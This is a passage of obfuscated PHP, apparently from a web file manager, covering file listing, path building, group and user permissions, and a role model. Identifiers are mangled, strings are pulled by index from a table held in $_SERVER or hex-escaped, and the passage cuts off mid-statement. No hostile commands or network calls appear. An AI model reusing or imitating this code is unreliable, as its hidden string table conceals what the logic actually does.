$šìáÎàÎ = Model($Ÿ÷ñîß¾[453])->listData(); $ƒß§„Â = Model($Ÿ÷ñîß¾[514])->listSimple(); $õç¢ÊÀÌ = array_to_keyvalue($©ïÜÑùÀ, $Ÿ÷ñîß¾[437]); $³§Â¹– = array_to_keyvalue_group($âö·¡²ø, $Ÿ÷ñîß¾[94], $Ÿ÷ñîß¾[464]); $‰éõÁÂÊ = array_to_keyvalue($šìáÎàÎ, $Ÿ÷ñîß¾[94]); $Úù©—ˆĞ = array_to_keyvalue_group($ƒß§„Â, $Ÿ÷ñîß¾[440]); foreach ($ß¢Ö£İ† as &$ÂèÕùâÃ) { $ÂèÕùâÃ[$Ÿ÷ñîß¾[97]] = array($Ÿ÷ñîß¾[515] => 0, $Ÿ÷ñîß¾[516] => 0, $Ÿ÷ñîß¾[517] => 0); if (isset($‰éõÁÂÊ[$ÂèÕùâÃ[$Ÿ÷ñîß¾[440]]])) { $ÂèÕùâÃ[$Ÿ÷ñîß¾[97]][$Ÿ÷ñîß¾[518]] = 1; $ÂèÕùâÃ[$Ÿ÷ñîß¾[97]][$Ÿ÷ñîß¾[519]] = $‰éõÁÂÊ[$ÂèÕùâÃ[$Ÿ÷ñîß¾[440]]][$Ÿ÷ñîß¾[32]]; } if ($³§Â¹– && $õç¢ÊÀÌ && isset($³§Â¹–[$ÂèÕùâÃ[$Ÿ÷ñîß¾[440]]])) { $ÂèÕùâÃ[$Ÿ÷ñîß¾[97]][$Ÿ÷ñîß¾[520]] = array(); foreach ($³§Â¹–[$ÂèÕùâÃ[$Ÿ÷ñîß¾[440]]] as $´¹ÇÄã‰) { $’Ã¹Ÿ® = $õç¢ÊÀÌ[$´¹ÇÄã‰]; $ÂèÕùâÃ[$Ÿ÷ñîß¾[97]][$Ÿ÷ñîß¾[520]][] = array($Ÿ÷ñîß¾[521] => $’Ã¹Ÿ®[$Ÿ÷ñîß¾[437]], $Ÿ÷ñîß¾[458] => $’Ã¹Ÿ®[$Ÿ÷ñîß¾[32]], $Ÿ÷ñîß¾[522] => $’Ã¹Ÿ®[$Ÿ÷ñîß¾[523]]); } } if ($Úù©—ˆĞ && isset($Úù©—ˆĞ[$ÂèÕùâÃ[$Ÿ÷ñîß¾[440]]])) { $ÂèÕùâÃ[$Ÿ÷ñîß¾[97]][$Ÿ÷ñîß¾[524]] = array(); foreach ($Úù©—ˆĞ[$ÂèÕùâÃ[$Ÿ÷ñîß¾[440]]] as $ ®œ°Î) { $µ€âƒ§ï = $Ÿ÷ñîß¾[525]; if ($ ®œ°Î[$Ÿ÷ñîß¾[526]] == $Ÿ÷ñîß¾[98]) { $µ€âƒ§ï .= $Ÿ÷ñîß¾[527]; } $ÂèÕùâÃ[$Ÿ÷ñîß¾[97]][$Ÿ÷ñîß¾[524]] = array_field_key($ ®œ°Î, explode($Ÿ÷ñîß¾[50], $µ€âƒ§ï)); } } } unset($ÂèÕùâÃ); return $ß¢Ö£İ†; } protected function _listAppendChildren(&$Ù¿ÕÏÒ, $İçáÖøê) { $–­–ò¦í =& $_SERVER[¹òÍ›æş]; $èªä°İ = array(); $ôƒ”ÏÅ° = array($–­–ò¦í[217] => 0, $–­–ò¦í[218] => 0); foreach ($Ù¿ÕÏÒ as &$Úİ¹ûÇÜ) { if (!$Úİ¹ûÇÜ[$–­–ò¦í[448]]) { continue; } $èªä°İ[] = $Úİ¹ûÇÜ[$–­–ò¦í[440]]; } unset($Úİ¹ûÇÜ); if (!$èªä°İ) { return; } $è“×˜ª… = array($–­–ò¦í[470] => array($–­–ò¦í[7], $èªä°İ), $–­–ò¦í[469] => 0); $íìÒªˆ = array($–­–ò¦í[470], $–­–ò¦í[448], $–­–ò¦í[528] => $–­–ò¦í[529]); $±íÉ´åâ = $this->field($íìÒªˆ)->where($è“×˜ª…)->group($–­–ò¦í[530])->select(); $´ş¹Ûìª = array(); foreach ($±íÉ´åâ as $†ø¾—áİ) { $¸ÒâòéÍ = $†ø¾—áİ[$–­–ò¦í[470]]; $ëÊñ»Äá = $†ø¾—áİ[$–­–ò¦í[448]] == $–­–ò¦í[98] ? $–­–ò¦í[218] : $–­–ò¦í[217]; if (!isset($´ş¹Ûìª[$¸ÒâòéÍ])) { $´ş¹Ûìª[$¸ÒâòéÍ] = array($–­–ò¦í[217] => 0, $–­–ò¦í[218] => 0); } $´ş¹Ûìª[$¸ÒâòéÍ][$ëÊñ»Äá] += $†ø¾—áİ[$–­–ò¦í[529]]; } foreach ($Ù¿ÕÏÒ as &$Úİ¹ûÇÜ) { if (!$Úİ¹ûÇÜ[$–­–ò¦í[448]]) { continue; } $Ô«Œ®Ş— = is_array($´ş¹Ûìª[$Úİ¹ûÇÜ[$–­–ò¦í[440]]]) ? $´ş¹Ûìª[$Úİ¹ûÇÜ[$–­–ò¦í[440]]] : $ôƒ”ÏÅ°; $Úİ¹ûÇÜ[$–­–ò¦í[218]] = $Ô«Œ®Ş—[$–­–ò¦í[218]]; $Úİ¹ûÇÜ[$–­–ò¦í[217]] = $Ô«Œ®Ş—[$–­–ò¦í[217]]; unset($Úİ¹ûÇÜ[$–­–ò¦í[450]]); } unset($Úİ¹ûÇÜ); } protected function _listAppendAuth(&$ë€ã¹—±) { $¿Ö®´Œ¤ =& $_SERVER[¹òÍ›æş]; $ÃÇŞ°ô¶ = array(); foreach ($ë€ã¹—± as $ı¥…Şî) { if ($ı¥…Şî[$¿Ö®´Œ¤[449]] == self::TYPE_GROUP) { $ÃÇŞ°ô¶[] = $ı¥…Şî[$¿Ö®´Œ¤[440]]; } } if (!$ÃÇŞ°ô¶) { return; } $Ä«àîºû = array_to_keyvalue($ë€ã¹—±, $¿Ö®´Œ¤[440]); $­¹÷ŒğÍ = Model($¿Ö®´Œ¤[531])->getSourceList($ÃÇŞ°ô¶, $Ä«àîºû); $—ÁŞ§ÊÄ = $GLOBALS[$¿Ö®´Œ¤[532]] == 1; foreach ($ë€ã¹—± as $Õ•ü®¸› => &$ı¥…Şî) { $ı¥…Şî[$¿Ö®´Œ¤[451]] = $­¹÷ŒğÍ[$ı¥…Şî[$¿Ö®´Œ¤[440]]]; if (!$ı¥…Şî[$¿Ö®´Œ¤[451]] && $ı¥…Şî[$¿Ö®´Œ¤[449]] == self::TYPE_GROUP) { $ı¥…Şî[$¿Ö®´Œ¤[451]] = Action($¿Ö®´Œ¤[533])->pathGroupAuthMake($ı¥…Şî[$¿Ö®´Œ¤[534]]); if (!$ı¥…Şî[$¿Ö®´Œ¤[451]] && !$—ÁŞ§ÊÄ) { $ı¥…Şî[$¿Ö®´Œ¤[213]] = !1; $ı¥…Şî[$¿Ö®´Œ¤[212]] = !1; } } if ($ı¥…Şî[$¿Ö®´Œ¤[451]]) { $ı¥…Şî[$¿Ö®´Œ¤[213]] = AuthModel::authCheckEdit($ı¥…Şî[$¿Ö®´Œ¤[451]][$¿Ö®´Œ¤[452]]); $ı¥…Şî[$¿Ö®´Œ¤[212]] = AuthModel::authCheckView($ı¥…Şî[$¿Ö®´Œ¤[451]][$¿Ö®´Œ¤[452]]); } $this->groupPathDisplay($ı¥…Şî); } unset($ı¥…Şî); } public function _listAppendAuthSecret(&$—“»ÀíÕ) { $¼İ«§‘ =& $_SERVER[¹òÍ›æş]; if (Model($¼İ«§‘[473])->get($¼İ«§‘[535]) != $¼İ«§‘[98]) { return; } static $§±ÍÙÅ = false; if (!$§±ÍÙÅ) { $ÈÔ©ó• = Model($¼İ«§‘[536]); $³¶‡ŸØÛ = Model($¼İ«§‘[537]); $§±ÍÙÅ = $³¶‡ŸØÛ->listData(); $§±ÍÙÅ = array_to_keyvalue($§±ÍÙÅ, $¼İ«§‘[440]); $á˜ÖÖ™ = json_decode(Model($¼İ«§‘[473])->get($¼İ«§‘[538]), !0); $á˜ÖÖ™ = array_to_keyvalue($á˜ÖÖ™, $¼İ«§‘[437]); foreach ($§±ÍÙÅ as $œ‹²ñ => $ÏøîÜ¢é) { $÷ßêóÀ = $á˜ÖÖ™[$ÏøîÜ¢é[$¼İ«§‘[539]]]; if (!$÷ßêóÀ) { $³¶‡ŸØÛ->remove($ÏøîÜ¢é[$¼İ«§‘[437]]); unset($§±ÍÙÅ[$œ‹²ñ]); continue; } $ãßúäşš = $ÈÔ©ó•->listData($÷ßêóÀ[$¼İ«§‘[451]]); if (!$ãßúäşš) { $³¶‡ŸØÛ->remove($ÏøîÜ¢é[$¼İ«§‘[437]]); unset($§±ÍÙÅ[$œ‹²ñ]); continue; } $ÏøîÜ¢é[$¼İ«§‘[451]] = $ãßúäşš; $ÏøîÜ¢é[$¼İ«§‘[540]] = $÷ßêóÀ; $ÏøîÜ¢é[$¼İ«§‘[541]] = Model($¼İ«§‘[542])->getInfoSimpleOuter($ÏøîÜ¢é[$¼İ«§‘[492]]); $§±ÍÙÅ[$œ‹²ñ] = $ÏøîÜ¢é; } } $ÄÏæ«ÂÈ = USER_ID; $÷§¾õÎÛ = array(); $Ø¸·Îí = $this->_listAppendPath($÷§¾õÎÛ, !0); foreach ($—“»ÀíÕ as $œ‹²ñ => &$ÏøîÜ¢é) { if (!is_array($ÏøîÜ¢é[$¼İ«§‘[451]])) { continue; } if ($ÏøîÜ¢é[$¼İ«§‘[449]] != $¼İ«§‘[543]) { continue; } if (isset($§±ÍÙÅ[$ÏøîÜ¢é[$¼İ«§‘[440]]])) { $şÒŒ°’ñ = $§±ÍÙÅ[$ÏøîÜ¢é[$¼İ«§‘[440]]]; if (!is_array($ÏøîÜ¢é[$¼İ«§‘[504]])) { $ÏøîÜ¢é[$¼İ«§‘[504]] = array(); } $ÏøîÜ¢é[$¼İ«§‘[504]][$¼İ«§‘[544]] = $şÒŒ°’ñ[$¼İ«§‘[539]]; $ÏøîÜ¢é[$¼İ«§‘[451]][$¼İ«§‘[545]] = $şÒŒ°’ñ; $ÏøîÜ¢é[$¼İ«§‘[451]][$¼İ«§‘[546]] = $ÏøîÜ¢é[$¼İ«§‘[547]]; $ÏøîÜ¢é[$¼İ«§‘[451]][$¼İ«§‘[548]] = $¼İ«§‘[98]; if ($şÒŒ°’ñ[$¼İ«§‘[492]] != $ÄÏæ«ÂÈ) { $ÏøîÜ¢é[$¼İ«§‘[451]][$¼İ«§‘[452]] = $ÏøîÜ¢é[$¼İ«§‘[451]][$¼İ«§‘[452]] & $şÒŒ°’ñ[$¼İ«§‘[451]][$¼İ«§‘[451]]; } continue; } $¢á¾š¯Û = $this->parentLevelArray($ÏøîÜ¢é[$¼İ«§‘[549]]); $ÛíÁò± = array_reverse($¢á¾š¯Û); foreach ($ÛíÁò± as $Â“±¸¨Ø => $˜÷¼‚ö²) { if (!isset($§±ÍÙÅ[$˜÷¼‚ö²])) { continue; } $şÒŒ°’ñ = $§±ÍÙÅ[$˜÷¼‚ö²]; $ÏøîÜ¢é[$¼İ«§‘[451]][$¼İ«§‘[545]] = $şÒŒ°’ñ; if ($şÒŒ°’ñ[$¼İ«§‘[492]] != $ÄÏæ«ÂÈ) { $ÏøîÜ¢é[$¼İ«§‘[451]][$¼İ«§‘[452]] = $ÏøîÜ¢é[$¼İ«§‘[451]][$¼İ«§‘[452]] & $şÒŒ°’ñ[$¼İ«§‘[451]][$¼İ«§‘[451]]; } $©¾ˆ‡× = $¼İ«§‘[12]; $–Ñ£à„± = count($¢á¾š¯Û) - $Â“±¸¨Ø; for ($ÇÂóî÷‹ = 0; $ÇÂóî÷‹ < $–Ñ£à„±; $ÇÂóî÷‹++) { if (!isset($Ø¸·Îí[$¢á¾š¯Û[$ÇÂóî÷‹]])) { $©¾ˆ‡× = $¼İ«§‘[12]; break; } $©¾ˆ‡× = $©¾ˆ‡× . rtrim($Ø¸·Îí[$¢á¾š¯Û[$ÇÂóî÷‹]], $¼İ«§‘[8]) . $¼İ«§‘[8]; } $ÏøîÜ¢é[$¼İ«§‘[451]][$¼İ«§‘[546]] = rtrim($©¾ˆ‡×, $¼İ«§‘[8]) . $¼İ«§‘[8]; break; } } unset($ÏøîÜ¢é); } public function groupPathDisplay(&$³£¸¸) { $êóç¨Äç =& $_SERVER[¹òÍ›æş]; if ($³£¸¸[$êóç¨Äç[449]] != self::TYPE_GROUP) { return; } $ÕèÀ‡’ = Model($êóç¨Äç[550])->getInfo($³£¸¸[$êóç¨Äç[534]]); $€ÖÉŠ¤µ = $this->parentLevelArray($ÕèÀ‡’[$êóç¨Äç[549]]); $ù¾ÃŸ˜ = $êóç¨Äç[12]; foreach ($€ÖÉŠ¤µ as $–±€Ø¢) { $†ÇşÀÕ˜ = Model($êóç¨Äç[550])->getInfo($–±€Ø¢); $ù¾ÃŸ˜ .= $†ÇşÀÕ˜[$êóç¨Äç[97]][$êóç¨Äç[440]] . $êóç¨Äç[50]; } $³£¸¸[$êóç¨Äç[551]] = $ÕèÀ‡’[$êóç¨Äç[470]]; $³£¸¸[$êóç¨Äç[552]] = $ÕèÀ‡’[$êóç¨Äç[549]]; $³£¸¸[$êóç¨Äç[553]] = $ÕèÀ‡’[$êóç¨Äç[554]]; $³£¸¸[$êóç¨Äç[555]] = $ù¾ÃŸ˜ . $ÕèÀ‡’[$êóç¨Äç[97]][$êóç¨Äç[440]]; } protected function _listAppendPath(&$È€Ğç·û, $óôñìº¢ = false) { $ÖëœÄ‚Î =& $_SERVER[¹òÍ›æş]; static $’ÌÊª¸ = array(); $¹ÊœÜİ = array(); $ÀÖ²ª¥½ = array(); if ($óôñìº¢) { return $’ÌÊª¸; } foreach ($È€Ğç·û as &$èêŞ¥º†) { $€çíÂ·Ë = $èêŞ¥º†[$ÖëœÄ‚Î[440]]; if ($èêŞ¥º†[$ÖëœÄ‚Î[448]] == $ÖëœÄ‚Î[98] && $èêŞ¥º†[$ÖëœÄ‚Î[470]] != 0) { $’ÌÊª¸[$€çíÂ·Ë] = $èêŞ¥º†[$ÖëœÄ‚Î[32]]; } if ($èêŞ¥º†[$ÖëœÄ‚Î[448]] == $ÖëœÄ‚Î[98] && $èêŞ¥º†[$ÖëœÄ‚Î[470]] == 0 && !isset($’ÌÊª¸[$€çíÂ·Ë])) { $’ÌÊª¸[$€çíÂ·Ë] = $this->_listAppendPathRoot($èêŞ¥º†, array()); } if (isset($ÀÖ²ª¥½[$èêŞ¥º†[$ÖëœÄ‚Î[549]]])) { continue; } $ÀÖ²ª¥½[$èêŞ¥º†[$ÖëœÄ‚Î[549]]] = !0; $ˆ™Å–Ùü = $this->parentLevelArray($èêŞ¥º†[$ÖëœÄ‚Î[549]]); foreach ($ˆ™Å–Ùü as $â†ç•§ => $ˆ—–¹¹˜) { if (isset($’ÌÊª¸[$ˆ—–¹¹˜])) { continue; } if ($â†ç•§ == 0) { $’ÌÊª¸[$ˆ—–¹¹˜] = $this->_listAppendPathRoot($èêŞ¥º†, $ˆ™Å–Ùü); } if ($â†ç•§ != 0) { $¹ÊœÜİ[] = $ˆ—–¹¹˜; } } } unset($èêŞ¥º†); $¹ÊœÜİ = array_unique($¹ÊœÜİ); if (count($¹ÊœÜİ) > 0) { $ªãÑâ„ = array($ÖëœÄ‚Î[455] => array($ÖëœÄ‚Î[456], $¹ÊœÜİ)); if (count($¹ÊœÜİ) == 1) { $‹—áş“Á = $this->sourceInfo($¹ÊœÜİ[0]); $ïÇÒñ­˜ = is_array($‹—áş“Á) ? array($‹—áş“Á) : !1; } else { $ïÇÒñ­˜ = $this->field($ÖëœÄ‚Î[556])->where($ªãÑâ„)->select(); } if (!$ïÇÒñ­˜) { $ïÇÒñ­˜ = array(); } foreach ($ïÇÒñ­˜ as $ùŒ¿’‹†) { $’ÌÊª¸[$ùŒ¿’‹†[$ÖëœÄ‚Î[440]]] = $ùŒ¿’‹†[$ÖëœÄ‚Î[32]]; } } $­Û‰ƒî = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $Õ–²¡öˆ = array(); foreach ($È€Ğç·û as &$èêŞ¥º†) { $åûë‰ÌÇ = $èêŞ¥º†[$ÖëœÄ‚Î[549]]; $ÉÍÉœ‘ı = $ÖëœÄ‚Î[12]; if (isset($Õ–²¡öˆ[$åûë‰ÌÇ])) { $ÉÍÉœ‘ı = $Õ–²¡öˆ[$åûë‰ÌÇ]; } else { $ˆ™Å–Ùü = $this->parentLevelArray($èêŞ¥º†[$ÖëœÄ‚Î[549]]); foreach ($ˆ™Å–Ùü as $â†ç•§ => $ˆ—–¹¹˜) { if (isset($’ÌÊª¸[$ˆ—–¹¹˜])) { $ÉÍÉœ‘ı .= $’ÌÊª¸[$ˆ—–¹¹˜] . $ÖëœÄ‚Î[8]; } } $Õ–²¡öˆ[$åûë‰ÌÇ] = $ÉÍÉœ‘ı; } $ÉÍÉœ‘ı .= $èêŞ¥º†[$ÖëœÄ‚Î[32]]; if ($èêŞ¥º†[$ÖëœÄ‚Î[448]] == $ÖëœÄ‚Î[98]) { $ÉÍÉœ‘ı .= $ÖëœÄ‚Î[8]; } $èêŞ¥º†[$ÖëœÄ‚Î[547]] = str_replace($ÖëœÄ‚Î[557], $ÖëœÄ‚Î[8], $ÉÍÉœ‘ı); if ($èêŞ¥º†[$ÖëœÄ‚Î[470]] == $ÖëœÄ‚Î[208]) { $èêŞ¥º†[$ÖëœÄ‚Î[32]] = trim($’ÌÊª¸[$èêŞ¥º†[$ÖëœÄ‚Î[440]]], $ÖëœÄ‚Î[8]); $èêŞ¥º†[$ÖëœÄ‚Î[547]] = $èêŞ¥º†[$ÖëœÄ‚Î[32]] . $ÖëœÄ‚Î[8]; } if (intval($èêŞ¥º†[$ÖëœÄ‚Î[449]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($èêŞ¥º†, $ˆ™Å–Ùü, $­Û‰ƒî); } } unset($èêŞ¥º†); return $È€Ğç·û; } private function _listAppendPathRecycle(&$Ï–ÈƒÎå, $ì‡ú£“, $šóÃÄ™ç) { $Ï°Ú÷‚é =& $_SERVER[¹òÍ›æş]; if (!in_array($šóÃÄ™ç, $ì‡ú£“) && $Ï–ÈƒÎå[$Ï°Ú÷‚é[440]] != $šóÃÄ™ç) { return; } $’ËÇöÑ = explode($Ï°Ú÷‚é[8], trim($Ï–ÈƒÎå[$Ï°Ú÷‚é[547]], $Ï°Ú÷‚é[8])); $£Úğ„×¯ = implode($Ï°Ú÷‚é[8], array_slice($’ËÇöÑ, 2)); $Ï–ÈƒÎå[$Ï°Ú÷‚é[547]] = $Ï°Ú÷‚é[8] . LNG($Ï°Ú÷‚é[558]) . $Ï°Ú÷‚é[8] . ltrim($£Úğ„×¯, $Ï°Ú÷‚é[8]); $Ï–ÈƒÎå[$Ï°Ú÷‚é[549]] = $Ï°Ú÷‚é[559] . implode($Ï°Ú÷‚é[50], array_slice($ì‡ú£“, 1)) . $Ï°Ú÷‚é[50]; if ($Ï–ÈƒÎå[$Ï°Ú÷‚é[440]] == $šóÃÄ™ç) { $Ï–ÈƒÎå[$Ï°Ú÷‚é[549]] = $Ï°Ú÷‚é[559]; $Ï–ÈƒÎå[$Ï°Ú÷‚é[470]] = $Ï°Ú÷‚é[208]; $Ï–ÈƒÎå[$Ï°Ú÷‚é[32]] = LNG($Ï°Ú÷‚é[558]); } $Ï–ÈƒÎå[$Ï°Ú÷‚é[560]] = $Ï°Ú÷‚é[561]; } protected function _listAppendPathRoot(&$½ÊÊâí¹, $×òš¹·Ã) { $˜‹ìæÔ =& $_SERVER[¹òÍ›æş]; static $¬“š¾ë = false; $ó—ûÑ…¼ = $˜‹ìæÔ[12]; if ($½ÊÊâí¹[$˜‹ìæÔ[449]] == self::TYPE_USER) { if ($½ÊÊâí¹[$˜‹ìæÔ[534]] == USER_ID) { $ó—ûÑ…¼ = LNG($˜‹ìæÔ[562]); if ($¬“š¾ë === !1) { $Úş®íİ£ = Model($˜‹ìæÔ[563])->getInfoFull(USER_ID); $¬“š¾ë = _get($Úş®íİ£, $˜‹ìæÔ[564], $˜‹ìæÔ[12]); } if ($×òš¹·Ã && $×òš¹·Ã[0] == $¬“š¾ë || !$×òš¹·Ã && $½ÊÊâí¹[$˜‹ìæÔ[440]] == $¬“š¾ë) { $ó—ûÑ…¼ = LNG($˜‹ìæÔ[565]); $½ÊÊâí¹[$˜‹ìæÔ[566]] = $˜‹ìæÔ[567]; } if (!$×òš¹·Ã) { $½ÊÊâí¹[$˜‹ìæÔ[32]] = $ó—ûÑ…¼; } } else { $ªäÍÊ¡û = Model($˜‹ìæÔ[542])->getInfoSimple($½ÊÊâí¹[$˜‹ìæÔ[534]]); $ó—ûÑ…¼ = LNG($˜‹ìæÔ[568]) . $˜‹ìæÔ[172] . $ªäÍÊ¡û[$˜‹ìæÔ[32]] . $˜‹ìæÔ[174]; $½ÊÊâí¹[$˜‹ìæÔ[569]] = array($˜‹ìæÔ[32] => $ªäÍÊ¡û[$˜‹ìæÔ[32]], $˜‹ìæÔ[570] => $ªäÍÊ¡û[$˜‹ìæÔ[570]], $˜‹ìæÔ[571] => $ªäÍÊ¡û[$˜‹ìæÔ[571]]); } } else { if ($½ÊÊâí¹[$˜‹ìæÔ[449]] == self::TYPE_GROUP) { $ªäÍÊ¡û = Model($˜‹ìæÔ[550])->getInfoSimple($½ÊÊâí¹[$˜‹ìæÔ[534]]); $ó—ûÑ…¼ = $ªäÍÊ¡û[$˜‹ìæÔ[32]]; } else { if ($½ÊÊâí¹[$˜‹ìæÔ[449]] == self::TYPE_SYSTEM) { $ó—ûÑ…¼ = $˜‹ìæÔ[572]; } } } $ó—ûÑ…¼ = $ó—ûÑ…¼ ? $˜‹ìæÔ[8] . $ó—ûÑ…¼ . $˜‹ìæÔ[8] : $˜‹ìæÔ[8]; return $ó—ûÑ…¼; } protected function _listAppendUser(&$¯µ‰­ğŞ) { $—ı§ú‰¶ =& $_SERVER[¹òÍ›æş]; $‚ª‰¡ç÷ = array_to_keyvalue($¯µ‰­ğŞ, $—ı§ú‰¶[12], $—ı§ú‰¶[492]); $•‰§¬ùÉ = array_to_keyvalue($¯µ‰­ğŞ, $—ı§ú‰¶[12], $—ı§ú‰¶[494]); $òäÚ ²ö = array_merge($‚ª‰¡ç÷, $•‰§¬ùÉ); $©Ñ½ƒç = Model($—ı§ú‰¶[563])->userListInfo($òäÚ ²ö); foreach ($¯µ‰­ğŞ as &$»Òô°ŠÁ) { $†ˆÌ„Öİ = $»Òô°ŠÁ[$—ı§ú‰¶[492]]; $»Òô°ŠÁ[$—ı§ú‰¶[492]] = $©Ñ½ƒç[$†ˆÌ„Öİ] ? $©Ñ½ƒç[$†ˆÌ„Öİ] : !1; $†ˆÌ„Öİ = $»Òô°ŠÁ[$—ı§ú‰¶[494]]; $»Òô°ŠÁ[$—ı§ú‰¶[494]] = $©Ñ½ƒç[$†ˆÌ„Öİ] ? $©Ñ½ƒç[$†ˆÌ„Öİ] : !1; if (isset($»Òô°ŠÁ[$—ı§ú‰¶[504]]) && $»Òô°ŠÁ[$—ı§ú‰¶[504]][$—ı§ú‰¶[573]]) { $ó­À”†‘ = $GLOBALS[$—ı§ú‰¶[6]][$—ı§ú‰¶[99]][$—ı§ú‰¶[574]]; if ($»Òô°ŠÁ[$—ı§ú‰¶[504]][$—ı§ú‰¶[575]] <= time() - $ó­À”†‘) { $this->metaSet($»Òô°ŠÁ[$—ı§ú‰¶[440]], $—ı§ú‰¶[573], null); $this->metaSet($»Òô°ŠÁ[$—ı§ú‰¶[440]], $—ı§ú‰¶[575], null); unset($»Òô°ŠÁ[$—ı§ú‰¶[504]][$—ı§ú‰¶[573]]); continue; } $Åêâù£Í = $»Òô°ŠÁ[$—ı§ú‰¶[504]][$—ı§ú‰¶[573]]; $»Òô°ŠÁ[$—ı§ú‰¶[504]][$—ı§ú‰¶[576]] = Model($—ı§ú‰¶[563])->getInfoSimpleOuter($Åêâù£Í); } } unset($»Òô°ŠÁ); } public function parentLevelArray($ Ê‚°¯µ) { $Å¹ì¦ß =& $_SERVER[¹òÍ›æş]; $ Ê‚°¯µ = explode($Å¹ì¦ß[50], trim($ Ê‚°¯µ, $Å¹ì¦ß[50])); return array_remove_value($ Ê‚°¯µ, $Å¹ì¦ß[208]); } public function listAll($ÇÊÌÃÛİ) { $Ö¹ªÑñ¢ =& $_SERVER[¹òÍ›æş]; $Î†ŞÒÕ‹ = $this->sourceInfo($ÇÊÌÃÛİ); $—Ş¹éº¬ = array($Ö¹ªÑñ¢[577] => array($Ö¹ªÑñ¢[578], $Î†ŞÒÕ‹[$Ö¹ªÑñ¢[549]] . $ÇÊÌÃÛİ . $Ö¹ªÑñ¢[579]), $Ö¹ªÑñ¢[580] => 0); $¸öÀõ· = $Ö¹ªÑñ¢[581]; $à®ãëÂÕ = "\114\105\106\124\x20\x4a\x4f\x49\x4e\40{$this->tablePrefix}\151\157\137\x66\151\154\145\x20\146\151\154\x65\40\157\156\x20\x73\x6f\x75\x72\x63\x65\56\x66\x69\x6c\x65\111\104\x20\x3d\x20\x66\151\x6c\x65\56\146\151\154\145\111\x44"; $óö³²± = $this->alias($Ö¹ªÑñ¢[484])->field($¸öÀõ·)->where($—Ş¹éº¬)->join($à®ãëÂÕ)->select(); $this->_listAppendAuth($óö³²±); $this->_listAppendUser($óö³²±); $this->_listAppendPath($óö³²±); $óö³²± = array_to_keyvalue($óö³²±, $Ö¹ªÑñ¢[440]); $êèäî‚ = "\57{$Î†ŞÒÕ‹[$Ö¹ªÑñ¢[32]]}\x2f"; $êèäî‚ = $êèäî‚ == $Ö¹ªÑñ¢[557] ? $Ö¹ªÑñ¢[8] : $êèäî‚; $£â¨·ë† = array(); foreach ($óö³²± as $šµ°ıÖ² => $¼½ÉÔ…ş) { $µÄˆÓ£‡ = $this->parentLevelArray($¼½ÉÔ…ş[$Ö¹ªÑñ¢[549]]); array_shift($µÄˆÓ£‡); $›€ùİà¨ = $êèäî‚; for ($Ÿõ³ı¢¡ = 0; $Ÿõ³ı¢¡ < count($µÄˆÓ£‡); $Ÿõ³ı¢¡++) { $›€ùİà¨ .= $óö³²±[$µÄˆÓ£‡[$Ÿõ³ı¢¡]][$Ö¹ªÑñ¢[32]] . $Ö¹ªÑñ¢[8]; } $›€ùİà¨ .= $¼½ÉÔ…ş[$Ö¹ªÑñ¢[32]]; if ($¼½ÉÔ…ş[$Ö¹ªÑñ¢[448]]) { $›€ùİà¨ .= $Ö¹ªÑñ¢[8]; } $¿º¹³ƒ = array($Ö¹ªÑñ¢[459] => str_replace($Ö¹ªÑñ¢[557], $Ö¹ªÑñ¢[8], str_replace($Ö¹ªÑñ¢[557], $Ö¹ªÑñ¢[8], str_replace($Ö¹ªÑñ¢[557], $Ö¹ªÑñ¢[8], $›€ùİà¨))), $Ö¹ªÑñ¢[582] => intval($¼½ÉÔ…ş[$Ö¹ªÑñ¢[448]]), $Ö¹ªÑñ¢[583] => intval($¼½ÉÔ…ş[$Ö¹ªÑñ¢[86]]), $Ö¹ªÑñ¢[95] => intval($¼½ÉÔ…ş[$Ö¹ªÑñ¢[95]]), $Ö¹ªÑñ¢[97] => $this->pathInfoFilter($¼½ÉÔ…ş)); if (!$¿º¹³ƒ[$Ö¹ªÑñ¢[448]]) { $¿º¹³ƒ[$Ö¹ªÑñ¢[506]] = $¼½ÉÔ…ş[$Ö¹ªÑñ¢[506]]; } $£â¨·ë†[] = $¿º¹³ƒ; } $£â¨·ë† = array_sort_by($£â¨·ë†, $Ö¹ªÑñ¢[94]); return $£â¨·ë†; } } goto fÍ·„ØÀˆğ; CŒÈƒÂğß‰: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\145\x6d\x2e\162\157\x6c\145\114\x69\163\164"; public $field = array("\x6e\141\155\145", "\141\165\x74\150", "\154\x61\142\145\x6c", "\x64\151\163\160\154\x61\x79", "\163\x79\x73\164\x65\x6d", "\144\x65\163\143", "\x69\147\156\157\162\145\x45\x78\164", "\x69\147\x6e\157\162\x65\106\x69\154\x65\x53\x69\172\x65", "\x61\144\x6d\x69\156\x69\x73\164\x72\x61\x74\157\x72", "\x73\x6f\x72\164"); public function listData($Äõ¾Î­ì = false, $ıËş¸Â = "\163\157\x72\164", $ŸÄôœ½ó = false) { $¶š´´Ìü =& $_SERVER[¹òÍ›æş]; $â¸¶â°Ü = parent::listData($Äõ¾Î­ì, $ıËş¸Â, $ŸÄôœ½ó); if (!$Äõ¾Î­ì) { foreach ($â¸¶â°Ü as $È†¹äÜó => $ÑÑşä£´) { if ($ÑÑşä£´[$¶š´´Ìü[2061]] == 1) { $â¸¶â°Ü[$È†¹äÜó][$¶š´´Ìü[491]] = LNG($¶š´´Ìü[2296]); } } } return $â¸¶â°Ü; } public function update($Ø’ÍçÏ», $«ÇæĞÅ) { $æÅ°ûíø =& $_SERVER[¹òÍ›æş]; $»Ø²“ûê = parent::listData($Ø’ÍçÏ»); $‚¬‡¡İ = $this->findByName($«ÇæĞÅ[$æÅ°ûíø[32]]); if (!$»Ø²“ûê || $‚¬‡¡İ && $‚¬‡¡İ[$æÅ°ûíø[437]] != $»Ø²“ûê[$æÅ°ûíø[437]]) { return !1; } if ($‚¬‡¡İ[$æÅ°ûíø[2061]] == 1) { $«ÇæĞÅ = array($æÅ°ûíø[32] => $«ÇæĞÅ[$æÅ°ûíø[32]], $æÅ°ûíø[1882] => $«ÇæĞÅ[$æÅ°ûíø[1882]]); } $this->filterAuth($«ÇæĞÅ[$æÅ°ûíø[451]]); return parent::update($Ø’ÍçÏ», $«ÇæĞÅ); } public function remove($´Ä‚©şğ) { $‘“Ì¡ = parent::listData($´Ä‚©şğ); if (!$‘“Ì¡ || $‘“Ì¡[$_SERVER[¹òÍ›æş][1314]]) { return !1; } return parent::remove($´Ä‚©şğ); } public function add($•¦•¼) { $íÖ—ûÂ… =& $_SERVER[¹òÍ›æş]; $¼§´¦ŠØ = 